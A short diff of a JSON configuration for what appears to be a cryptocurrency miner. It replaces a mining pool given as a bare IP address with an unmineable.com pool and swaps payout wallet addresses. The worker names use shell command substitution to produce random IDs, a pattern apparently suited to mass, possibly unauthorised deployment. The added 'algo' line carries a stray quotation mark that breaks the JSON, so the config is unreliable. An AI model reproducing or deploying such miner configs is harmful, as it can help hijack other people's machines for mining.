@@ -60,10 +60,10 @@
     "log-file": null,
     "pools": [
         {
-            "algo": "rx/0",
+            "algo": null",
             "coin": null,
-            "url": "138.197.12.20:443",
-            "user": "ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY.$(shuf -n 1 -i 1-99999)",
+            "url": "rx.unmineable.com:3333",
+            "user": "BONK:Ea6Pj4rwN8qixCPuWrE9X9wDFwTQYxFcXFUTJs2VDKR9.$(echo rstd/$(shuf -i 1-999 -n 1))",
             "pass": "x",
             "rig-id": "null",
             "nicehash": false,
